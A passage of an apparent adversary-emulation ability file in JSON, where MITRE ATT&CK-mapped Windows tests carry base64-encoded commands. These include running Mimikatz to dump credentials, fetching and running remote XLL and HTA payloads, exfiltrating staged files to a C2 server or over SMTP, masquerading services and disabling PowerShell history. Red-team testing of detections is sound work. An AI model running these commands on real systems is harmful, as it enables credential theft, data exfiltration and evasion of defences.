OyRyZXM9KFtXaW5kb3dzLkZvcm1zLkNsaXBib2FyZF06OkdldFRleHQoKSl9O1tXaW5kb3dzLkZvcm1zLkNsaXBib2FyZF06OkNsZWFyKCk7QCgnJWYnLCd4Jyl8Rm9yRWFjaHskd3NoZWxsLlNlbmRLZXlzKChWYXJpYWJsZSBfKS5WYWx1ZSl9O0lmKEdQU3w/eyhJdGVtIFZhcmlhYmxlOl8pLlZhbHVlLmlkLWllcSRjdXJwaWR9KXtAKCd7VEFCfScsJ34nKXxGb3JFYWNoeyR3c2hlbGwuU2VuZEtleXMoKEl0ZW0gVmFyaWFibGU6XykuVmFsdWUpfX07QCgnaVdpbmRvd1Bvc0RZJywnaVdpbmRvd1Bvc0RYJywnaVdpbmRvd1Bvc1knLCdpV2luZG93UG9zWCcsJ1N0YXR1c0JhcicpfEZvckVhY2h7U1AgJHJlZyAoSXRlbSBWYXJpYWJsZTpfKS5WYWx1ZSAkcHJvcHMuKChWYXJpYWJsZSBfKS5WYWx1ZSl9O0lFWCgkcmVzKTtpbnZva2UtbWltaWthdHogLWR1bXBjcg==", "ability_id": "90c76bd616efee6d7c98dc6c1dcc6e99", "technique_name": "Command and Scripting Interpreter: PowerShell", "additional_info": {}, "privilege": "", "technique_id": "T1059.001", "platform": "windows", "name": "Mimikatz - Cradlecraft PsSendKeys", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Run mimikatz via PsSendKeys. Upon execution, automated actions will take place to open file explorer, open notepad and input code, then mimikatz dump info will be displayed.\n", "variations": []}, {"test": "cG93ZXJzaGVsbCAtYyAiaXdyIC1VUkkgJ2h0dHBzOi8vZ2l0aHViLmNvbS9yZWRjYW5hcnljby9hdG9taWMtcmVkLXRlYW0vcmF3L21hc3Rlci9hdG9taWNzL1QxMTM3LjAwNi9iaW4vSGVsbG9Xb3JsZFhsbC54bGwnIC1vICckZW52OnRtcFxIZWxsb1dvcmxkWGxsLnhsbCc7IElFWCAoKG5ldy1vYmplY3QgLUNvbU9iamVjdCBleGNlbC5hcHBsaWNhdGlvbikuUmVnaXN0ZXJYTEwoJyRlbnY6dG1wXEhlbGxvV29ybGRYbGwueGxsJykpIg==", "ability_id": "ba9b39032742832a67ab8fe5097b201a", "technique_name": "Office Application Startup: Add-ins", "additional_info": {}, "privilege": "", "technique_id": "T1137.006", "platform": "windows", "name": "Code Executed Via Excel Add-in File (Xll)", "requirements": [], "tactic": "persistence", "buckets": ["persistence"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Downloads a XLL file and loads it using the excel add-ins library.\nThis causes excel to display the message \"Hello World\"\nSource of XLL - https://github.com/edparcell/HelloWorldXll \n", "variations": []}, {"test": "cmVnIGFkZCBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXENhcGFiaWxpdHlBY2Nlc3NNYW5hZ2VyXENvbnNlbnRTdG9yZVxtaWNyb3Bob25lXE5vblBhY2thZ2VkXEM6I1dpbmRvd3MjVGVtcCNhdG9taWMuZXhlIC92IExhc3RVc2VkVGltZVN0YXJ0IC90IFJFR19CSU5BUlkgL2QgYTI3M2I2ZjA3MTA0ZDYwMSAvZiAmJiByZWcgYWRkIEhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cQ2FwYWJpbGl0eUFjY2Vzc01hbmFnZXJcQ29uc2VudFN0b3JlXG1pY3JvcGhvbmVcTm9uUGFja2FnZWRcQzojV2luZG93cyNUZW1wI2F0b21pYy5leGUgL3YgTGFzdFVzZWRUaW1lU3RvcCAvdCBSRUdfQklOQVJZIC9kIDk2ZWY1MTRiNzIwNGQ2MDEgL2Y=", "ability_id": "372e6f46fca18e4f1b43209c20ffafa2", "technique_name": "Audio Capture", "additional_info": {}, "privilege": "", "technique_id": "T1123", "platform": "windows", "name": "Registry artefact when application use microphone", "requirements": [], "tactic": "collection", "buckets": ["collection"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["cmVnIERFTEVURSBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXENhcGFiaWxpdHlBY2Nlc3NNYW5hZ2VyXENvbnNlbnRTdG9yZVxtaWNyb3Bob25lXE5vblBhY2thZ2VkXEM6I1dpbmRvd3MjVGVtcCNhdG9taWMuZXhlIC9m"], "executor": "cmd", "access": {}, "description": "[can-you-track-processes-accessing-the-camera-and-microphone](https://svch0st.medium.com/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072)\n", "variations": []}, {"test": "JHdjPU5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQ7JG91dHB1dD0iUG93ZXJTaGVsbENvcmUubXNpIjskd2MuRG93bmxvYWRGaWxlKCJodHRwczovL2dpdGh1Yi5jb20vUG93ZXJTaGVsbC9Qb3dlclNoZWxsL3JlbGVhc2VzL2Rvd25sb2FkL3Y2LjIuMi9Qb3dlclNoZWxsLTYuMi4yLXdpbi14NjQubXNpIiwgJG91dHB1dCk7U3RhcnQtUHJvY2VzcyBtc2lleGVjLmV4ZSAtQXJndW1lbnRMaXN0ICIvcGFja2FnZSBQb3dlclNoZWxsQ29yZS5tc2kgL3F1aWV0IEFERF9FWFBMT1JFUl9DT05URVhUX01FTlVfT1BFTlBPV0VSU0hFTEw9MSBFTkFCTEVfUFNSRU1PVElORz0xIFJFR0lTVEVSX01BTklGRVNUPTEiIC1XYWl0OyRlbnY6UGF0aCArPSAiO0M6XFByb2dyYW0gRmlsZXNcUG93ZXJzaGVsbFw2IjtTdGFydC1Qcm9jZXNzIHB3c2ggLUFyZ3VtZW50TGlzdCAiLWMgI3tsb2NhdGlvbn0gLXNlcnZlciAje3NlcnZlcn0gLSBncm91cCAje2dyb3VwfSIgLVdpbmRvd1N0eWxlIGhpZGRlbjs=", "ability_id": "60f63260-39bb-4136-87a0-b6c2dca799fc", "technique_name": "Ingress Tool Transfer", "additional_info": {}, "privilege": "", "technique_id": "T1105", "platform": "windows", "name": "Install PowerShell Core 6", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["cm0gUG93ZXJTaGVsbENvcmUubXNpOw=="], "executor": "psh", "access": {}, "description": "Download, install and start new process under PowerShell Core 6", "variations": []}, {"test": "JEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICdTdG9wJzskZmllbGROYW1lID0gJyN7aG9zdC5kaXIuY29tcHJlc3N9JzskZmlsZVBhdGggPSAnI3tob3N0LmRpci5jb21wcmVzc30nOyR1cmwgPSAiI3tzZXJ2ZXJ9L2ZpbGUvdXBsb2FkIjtBZGQtVHlwZSAtQXNzZW1ibHlOYW1lICdTeXN0ZW0uTmV0Lkh0dHAnOyRjbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuSHR0cC5IdHRwQ2xpZW50OyRjb250ZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0Lkh0dHAuTXVsdGlwYXJ0Rm9ybURhdGFDb250ZW50OyRmaWxlU3RyZWFtID0gW1N5c3RlbS5JTy5GaWxlXTo6T3BlblJlYWQoJGZpbGVQYXRoKTskZmlsZU5hbWUgPSBbU3lzdGVtLklPLlBhdGhdOjpHZXRGaWxlTmFtZSgkZmlsZVBhdGgpOyRmaWxlQ29udGVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5IdHRwLlN0cmVhbUNvbnRlbnQoJGZpbGVTdHJlYW0pOyRjb250ZW50LkFkZCgkZmlsZUNvbnRlbnQsICRmaWVsZE5hbWUsICRmaWxlTmFtZSk7JGNsaWVudC5EZWZhdWx0UmVxdWVzdEhlYWRlcnMuQWRkKCJYLVJlcXVlc3QtSWQiLCAkZW52OkNPTVBVVEVSTkFNRSArICctI3twYXd9Jyk7JGNsaWVudC5EZWZhdWx0UmVxdWVzdEhlYWRlcnMuQWRkKCJVc2VyLUFnZW50IiwiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzYwLjAuMzExMi4xMTMgU2FmYXJpLzUzNy4zNiIpOyRyZXN1bHQgPSAkY2xpZW50LlBvc3RBc3luYygkdXJsLCAkY29udGVudCkuUmVzdWx0OyRyZXN1bHQuRW5zdXJlU3VjY2Vzc1N0YXR1c0NvZGUoKTs=", "ability_id": "ea713bc4-63f0-491c-9a6f-0b01d560b87e", "technique_name": "Exfiltration Over C2 Channel", "additional_info": {}, "privilege": "", "technique_id": "T1041", "platform": "windows", "name": "Exfil staged directory", "requirements": [{"relationship_match": [{"source": "host.dir.compress"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "tactic": "exfiltration", "buckets": ["exfiltration"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Exfil the staged directory", "variations": []}, {"test": "SW52b2tlLUFUSEhUTUxBcHBsaWNhdGlvbiAtSFRBVXJpIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yZWRjYW5hcnljby9hdG9taWMtcmVkLXRlYW0vMjQ1NDllMzg2NjQwN2MzMDgwYjk1YjZhZmViZjc4ZThhY2QyMzM1Mi9hdG9taWNzL1QxMjE4LjAwNS9zcmMvVDEyMTguMDA1Lmh0YSAtTVNIVEFGaWxlUGF0aCAkZW52OndpbmRpclxzeXN0ZW0zMlxtc2h0YS5leGU=", "ability_id": "d0bff81a46dbb6486aa1c58ef62d963e", "technique_name": "Signed Binary Proxy Execution: Mshta", "additional_info": {}, "privilege": "", "technique_id": "T1218.005", "platform": "windows", "name": "Invoke HTML Application - Direct download from URI", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Executes an HTA Application by directly downloading from remote URI.", "variations": []}, {"test": "c2MgY3JlYXRlIHdpbjMydGltZXMgYmluUGF0aD0gImNtZCAvYyBzdGFydCBjOlxUMTAzNi4wMDRfTm9uRXhpc3RpbmdTY3JpcHQucHMxIiAmJiBzYyBxYyB3aW4zMnRpbWVz", "ability_id": "1f0614ea5c4af6faf1b44570f5f22f8a", "technique_name": "Masquerading: Masquerade Task or Service", "additional_info": {}, "privilege": "", "technique_id": "T1036.004", "platform": "windows", "name": "Creating W32Time similar named service using sc", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["c2MgZGVsZXRlIHdpbjMydGltZXM="], "executor": "cmd", "access": {}, "description": "Creating W32Time similar named service (win32times) using sc just like threat actor dubbed \"Operation Wocao\"", "variations": []}, {"test": "Y29weSAld2luZGlyJVxzeXN0ZW0zMlxjZXJ0dXRpbC5leGUgJXRlbXAlXHRjbS50bXAgJiYgJXRlbXAlXHRjbS50bXAgLWVuY29kZSBDOlxXaW5kb3dzXFN5c3RlbTMyXGNhbGMuZXhlICV0ZW1wJVxUMTE0MF9jYWxjMi50eHQgJiYgJXRlbXAlXHRjbS50bXAgLWRlY29kZSAldGVtcCVcVDExNDBfY2FsYzIudHh0ICV0ZW1wJVxUMTE0MF9jYWxjMl9kZWNvZGVkLmV4ZQ==", "ability_id": "abf12d5addc3695bc1009b750e301c8b", "technique_name": "Deobfuscate/Decode Files or Information", "additional_info": {}, "privilege": "", "technique_id": "T1140", "platform": "windows", "name": "Certutil Rename and Decode", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsICV0ZW1wJVx0Y20udG1wID5udWwgMj4mMSAmJiBkZWwgJXRlbXAlXFQxMTQwX2NhbGMyLnR4dCA+bnVsIDI+JjEgJiYgZGVsICV0ZW1wJVxUMTE0MF9jYWxjMl9kZWNvZGVkLmV4ZSA+bnVsIDI+JjE="], "executor": "cmd", "access": {}, "description": "Rename certutil and decode a file. This is in reference to latest research by FireEye [here](https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html)\n", "variations": []}, {"test": "Zmx0bWMuZXhlIHwgZmluZHN0ci5leGUgMzg1MjAx", "ability_id": "33a24ff44719e6ac0614b58f8c9a7c72", "technique_name": "Software Discovery: Security Software Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1518.001", "platform": "windows", "name": "Security Software Discovery - Sysmon Service", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Discovery of an installed Sysinternals Sysmon service using driver altitude (even if the name is changed).\n\nwhen sucessfully executed, the test is going to display sysmon driver instance if it is installed.\n", "variations": []}, {"test": "KFthZHNpc2VhcmNoZXJdIm9iamVjdGNhdGVnb3J5PXVzZXIiKS5GaW5kQWxsKCk7IChbYWRzaXNlYXJjaGVyXSJvYmplY3RjYXRlZ29yeT11c2VyIikuRmluZE9uZSgp", "ability_id": "609639cc9a1e5b4221e54c253f2147b5", "technique_name": "Account Discovery: Domain Account", "additional_info": {}, "privilege": "", "technique_id": "T1087.002", "platform": "windows", "name": "Enumerate Active Directory Users with ADSISearcher", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "The following Atomic test will utilize ADSISearcher to enumerate users within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n", "variations": []}, {"test": "R2V0LVNtYlNoYXJlIHwgQ29udmVydFRvLUpzb24=", "ability_id": "530e47c6-8592-42bf-91df-c59ffbd8541b", "technique_name": "Network Share Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1135", "platform": "windows", "name": "View admin shares", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.json", "relationships": [{"edge": "", "source": "domain.smb.share", "custom_parser_vals": {"json_key": "Path", "json_type": "str"}, "target": ""}]}], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Network Share Discovery", "variations": []}, {"test": "MTIwMTFjX0FkRmluZC5leGUgLWYgKG9iamVjdGNhdGVnb3J5PXN1Ym5ldCk=", "ability_id": "56d6dc2628d8f8c7ceec54f8641d21bf", "technique_name": "System Network Configuration Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1016", "platform": "windows", "name": "Adfind - Enumerate Active Directory Subnet Objects", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["12011c_AdFind.exe"], "cleanup": [], "executor": "cmd", "access": {}, "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Subnet Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n", "variations": []}, {"test": "U2V0LVBTUmVhZGxpbmVPcHRpb24g4oCTSGlzdG9yeVNhdmVTdHlsZSBTYXZlTm90aGluZw==", "ability_id": "1053040f992d9c1aa354b5fd0fa118ee", "technique_name": "Indicator Removal on Host: Clear Command History", "additional_info": {}, "privilege": "", "technique_id": "T1070.003", "platform": "windows", "name": "Prevent Powershell History Logging", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["U2V0LVBTUmVhZExpbmVPcHRpb24gLUhpc3RvcnlTYXZlU3R5bGUgU2F2ZUluY3JlbWVudGFsbHk="], "executor": "psh", "access": {}, "description": "Prevents Powershell history\n", "variations": []}, {"test": "Q29weS1JdGVtICN7aG9zdC5maWxlLnBhdGhbZmlsdGVycyh0ZWNobmlxdWU9VDEwMDUsbWF4PTMpXX0gI3tob3N0LmRpci5zdGFnZWRbZmlsdGVycyhtYXg9MSldfQ==", "ability_id": "4e97e699-93d7-4040-b5a3-2e906a58199e", "technique_name": "Data Staged: Local Data Staging", "additional_info": {}, "privilege": "", "technique_id": "T1074.001", "platform": "windows", "name": "Stage sensitive files", "requirements": [{"relationship_match": [{"source": "host.file.path"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}, {"relationship_match": [{"source": "host.dir.staged"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "tactic": "collection", "buckets": ["collection"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "copy files to staging directory", "variations": []}, {"test": "Y29weSAkZW52OkNvbVNwZWMgKCRlbnY6VEVNUCArICJcc3ZjaG9zdC5leGUiKTsgJG15VDEwMzZfMDAzID0gKFN0YXJ0LVByb2Nlc3MgLVBhc3NUaHJ1IC1GaWxlUGF0aCAoJGVudjpURU1QICsgIlxzdmNob3N0LmV4ZSIpKS5JZDsgU3RvcC1Qcm9jZXNzIC1JRCAkbXlUMTAzNl8wMDM=", "ability_id": "04e8d83e7badf098d50800d6aa1dd487", "technique_name": "Masquerading: Rename System Utilities", "additional_info": {}, "privilege": "", "technique_id": "T1036.003", "platform": "windows", "name": "Masquerading - windows exe running as different windows exe", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gKCRlbnY6VEVNUCArICJcc3ZjaG9zdC5leGUiKSAtRm9yY2UgLUVycm9yQWN0aW9uIElnbm9yZQ=="], "executor": "psh", "access": {}, "description": "Copies a windows exe, renames it as another windows exe, and launches it to masquerade as second windows exe\n", "variations": []}, {"test": "RXhwYW5kLUFyY2hpdmUgLVBhdGggJGVudjp1c2VycHJvZmlsZVxEb3dubG9hZHNcVDEwMzYuemlwIC1EZXN0aW5hdGlvblBhdGggJGVudjp1c2VycHJvZmlsZVxEb3dubG9hZHNcVDEwMzYgLUZvcmNlOyBjZCAkZW52OnVzZXJwcm9maWxlXERvd25sb2Fkc1xUMTAzNjsgY21kIC9jICRlbnY6dXNlcnByb2ZpbGVcRG93bmxvYWRzXFQxMDM2XFJFQURNRS5jbWQgPiRudWxsIDI+JG51bGw=", "ability_id": "0bcebac390d0550b00743c741297ddfe", "technique_name": "Masquerading", "additional_info": {}, "privilege": "", "technique_id": "T1036", "platform": "windows", "name": "Malware Masquerading and Execution from Zip File", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["dGFza2tpbGwgL0lNIENhbGN1bGF0b3IuZXhlIC9mID4kbnVsbCAyPiRudWxsOyBSZW1vdmUtSXRlbSAkZW52OnVzZXJwcm9maWxlXERvd25sb2Fkc1xUMTAzNiAtcmVjdXJzZSAtRXJyb3JBY3Rpb24gSWdub3Jl"], "executor": "psh", "access": {}, "description": "When the file is unzipped and the README.cmd file opened, it executes and changes the .pdf to .dll and executes the dll. This is a BazaLoader technique [as reported here](https://twitter.com/ffforward/status/1481672378639912960)", "variations": []}, {"test": "U2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtMTTpcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XENvbnRyb2xcVGVybWluYWwgU2VydmVyXFdpblN0YXRpb25zXFJEUC1UY3AnIC1uYW1lICJQb3J0TnVtYmVyIiAtVmFsdWUgNDQ4OTsgTmV3LU5ldEZpcmV3YWxsUnVsZSAtRGlzcGxheU5hbWUgJ1JEUFBPUlRMYXRlc3QtVENQLUluJyAtUHJvZmlsZSAnUHVibGljJyAtRGlyZWN0aW9uIEluYm91bmQgLUFjdGlvbiBBbGxvdyAtUHJvdG9jb2wgVENQIC1Mb2NhbFBvcnQgNDQ4OQ==", "ability_id": "0dceba0336f08525bbd06a05c7b4e671", "technique_name": "Remote Services: Remote Desktop Protocol", "additional_info": {}, "privilege": "", "technique_id": "T1021.001", "platform": "windows", "name": "Changing RDP Port to Non Standard Port via Powershell", "requirements": [], "tactic": "lateral-movement", "buckets": ["lateral-movement"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["U2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtMTTpcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XENvbnRyb2xcVGVybWluYWwgU2VydmVyXFdpblN0YXRpb25zXFJEUC1UY3AnIC1uYW1lICJQb3J0TnVtYmVyIiAtVmFsdWUgMzM4OTsgUmVtb3ZlLU5ldEZpcmV3YWxsUnVsZSAtRGlzcGxheU5hbWUgIlJEUFBPUlRMYXRlc3QtVENQLUluIiAtRXJyb3JBY3Rpb24gaWdub3Jl"], "executor": "psh", "access": {}, "description": "Changing RDP Port to Non Standard Port via Remote Desktop Application over Powershell\n", "variations": []}, {"test": "U2VuZC1NYWlsTWVzc2FnZSAtRnJvbSAje3NlbmRlcn0gLVRvICN7cmVjZWl2ZXJ9IC1TdWJqZWN0ICJUMTA0OC4wMDMgQXRvbWljIFRlc3QiIC1BdHRhY2htZW50cyAje2lucHV0X2ZpbGV9IC1TbXRwU2VydmVyICN7c210cF9zZXJ2ZXJ9", "ability_id": "8fc77040527dcb96c734875de6eaf4ab", "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol", "additional_info": {}, "privilege": "", "technique_id": "T1048.003", "platform": "windows", "name": "Exfiltration Over Alternative Protocol - SMTP", "requirements": [], "tactic": "exfiltration", "buckets": ["exfiltration"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Exfiltration of specified file over SMTP.\nUpon successful execution, powershell will send an email with attached file to exfiltrateto a remote address. Results will be via stdout.\n", "variations": []}, {"test": "R2V0LURhdGU=", "ability_id": "6913e132cdd2d9c29294490c2fbef2eb", "technique_name": "System Time Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1124", "platform": "windows", "name": "System Time Discovery - PowerShell", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Identify the system time via PowerShell. Upon execution, the system time will be displayed.\n", "variations": []}, {"test": "Y29udHJvbC5leGUgMTg3ZTY3X2NhbGMuY3Bs", "ability_id": "538e16479be335190f7d17f70f9ababc", "technique_name": "Signed Binary Proxy Execution: Control Panel", "additional_info": {}, "privilege": "", "technique_id": "T1218.002", "platform": "windows", "name": "Control Panel Items", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["187e67_calc.cpl"], "cleanup": [], "executor": "cmd", "access": {}, "description": "This test simulates an adversary leveraging control.exe\nUpon execution calc.exe will be launched\n", "variations": []}, {"test": "SW52b2tlLVdlYlJlcXVlc3QgLU91dEZpbGUgQzpcVXNlcnNcJGVudjp1c2VybmFtZVxEZXNrdG9wXExvZ01lSW5JZ25pdGlvbi5tc2kgaHR0cHM6Ly9zZWN1cmUubG9nbWVpbi5jb20vTG9nTWVJbklnbml0aW9uLm1zaTsgJGZpbGUxID0gIkM6XFVzZXJzXCIgKyAkZW52OnVzZXJuYW1lICsgIlxEZXNrdG9wXExvZ01lSW5JZ25pdGlvbi5tc2kiOyBTdGFydC1Qcm9jZXNzIC1XYWl0ICRmaWxlMSAvcXVpZXQ7OyBTdGFydC1Qcm9jZXNzICdDOlxQcm9ncmFtIEZpbGVzICh4ODYpXExvZ01lSW4gSWduaXRpb25cTE1JSWduaXRpb24uZXhlJyAiL1Mi", "ability_id": "f1b3fca18d7465cd10e5a7477a3bf97d", "technique_name": "Remote Access Software", "additional_info": {}, "privilege": "", "technique_id": "T1219", "platform": "windows", "name": "LogMeIn Files Detected Test on Windows", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["Z2V0LXBhY2thZ2UgKidMb2dNZUluIENsaWVudCcqIC1FcnJvckFjdGlvbiBJZ25vcmUgfCB1bmluc3RhbGwtcGFja2FnZSA7ICRmaWxlMSA9ICJDOlxVc2Vyc1wiICsgJGVudjp1c2VybmFtZSArICJcRGVza3RvcFxMb2dNZUluSWduaXRpb24ubXNpIjsgUmVtb3ZlLUl0ZW0gJGZpbGUxIC1FcnJvckFjdGlvbiBJZ25vcmU="], "executor": "psh", "access": {}, "description": "An adversary may attempt to trick the user into downloading LogMeIn and use to establish C2. Download of LogMeIn installer will be at the destination location and ran when sucessfully executed.\n", "variations": []}, {"test": "Y29weSBDOlxXaW5kb3dzXFN5c3RlbTMyXGNtZC5leGUgQzpcbHNtLmV4ZSAmJiBDOlxsc20uZXhlIC9jIGVjaG8gVDEwMzYuMDAzID4gQzpcVDEwMzYuMDAzLnR4dA==", "ability_id": "18348573c1f989a6cca9e9bf10809700", "technique_name": "Masquerading: Rename System Utilities", "additional_info": {}, "privilege": "", "technique_id": "T1036.003", "platform": "windows", "name": "Malicious process Masquerading as LSM.exe", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsIEM6XFQxMDM2LjAwMy50eHQgPm51bCAyPiYxICYmIGRlbCBDOlxsc20uZXhlID5udWwgMj4mMQ=="], "executor": "cmd", "access": {}, "description": "Detect LSM running from an incorrect directory and an incorrect service account\nThis works by copying cmd.exe to a file, naming it lsm.exe, then copying a file to the C:\\ folder.\n\nUpon successful execution, cmd.exe will be renamed as lsm.exe and executed from non-standard path.\n", "variations": []}, {"test": "ZGlyICRlbnY6VVNFUlBST0ZJTEUgLVJlY3Vyc2UgfCBDb21wcmVzcy1BcmNoaXZlIC1EZXN0aW5hdGlvblBhdGggJGVudjpVU0VSUFJPRklMRVxUMTU2MC1kYXRhLXBzLnppcA==", "ability_id": "a1ee301b0508747b468d578a14e5c1a5", "technique_name": "Archive Collected Data", "additional_info": {}, "privilege": "", "technique_id": "T1560", "platform": "windows", "name": "Compress Data for Exfiltration With PowerShell", "requirements": [], "tactic": "collection", "buckets": ["collection"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gLXBhdGggJGVudjpVU0VSUFJPRklMRVxUMTU2MC1kYXRhLXBzLnppcCAtRXJyb3JBY3Rpb24gSWdub3Jl"], "executor": "psh", "access": {}, "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration.\nWhen the test completes you should find the files from the $env:USERPROFILE directory compressed in a file called T1560-data-ps.zip in the $env:USERPROFILE directory \n", "variations": []}, {"test": "JGV4dExpc3QgPSAiZmNmaHBscGxvY2NhY2tvbmVhZWZva2NtYmpmYmtlbmoiLCAiZmRjZ2Rua2lkamFhZGFmbmljaGZwYWJoZm9tY2VibWUiOyA7IGZvcmVhY2ggKCRleHRlbnNpb24gaW4gJGV4dExpc3QpIHs7ICAgTmV3LUl0ZW0gLVBhdGggSEtMTTpcU29mdHdhcmVcV293NjQzMk5vZGVcR29vZ2xlXENocm9tZVxFeHRlbnNpb25zXCRleHRlbnNpb24gLUZvcmNlOyAgIE5ldy1JdGVtUHJvcGVydHkgLVBhdGggIkhLTE06XFNvZnR3YXJlXFdvdzY0MzJOb2RlXEdvb2dsZVxDaHJvbWVcRXh0ZW5zaW9uc1wkZXh0ZW5zaW9uIiAtTmFtZSAidXBkYXRlX3VybCIgLVZhbHVlICJodHRwczovL2NsaWVudHMyLmdvb2dsZS5jb20vc2VydmljZS91cGRhdGUyL2NyeCIgLVByb3BlcnR5VHlwZSAiU3RyaW5nIiAtRm9yY2V9OyBTdGFydCBjaHJvbWU7IFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDMwOyBTdG9wLVByb2Nlc3MgLU5hbWUgImNocm9tZSI=", "ability_id": "bc8b09387f195039c50f55b211b2077f", "technique_name": "External Remote Services", "additional_info": {}, "privilege": "", "technique_id": "T1133", "platform": "windows", "name": "Running Chrome VPN Extensions via the Registry 2 vpn extension", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["JGV4dExpc3QgPSAiZmNmaHBscGxvY2NhY2tvbmVhZWZva2NtYmpmYmtlbmoiLCAiZmRjZ2Rua2lkamFhZGFmbmljaGZwYWJoZm9tY2VibWUiOyA7IGZvcmVhY2ggKCRleHRlbnNpb24gaW4gJGV4dExpc3QpIHs7IFJlbW92ZS1JdGVtIC1QYXRoICJIS0xNOlxTb2Z0d2FyZVxXb3c2NDMyTm9kZVxHb29nbGVcQ2hyb21lXEV4dGVuc2lvbnNcJGV4dGVuc2lvbiIgLUVycm9yQWN0aW9uIElnbm9yZX0="], "executor": "psh", "access": {}, "description": "Running Chrome VPN Extensions via the Registry install 2 vpn extension, please see \"T1133\\src\\list of vpn extension.txt\" to view complete list\n", "variations": []}, {"test": 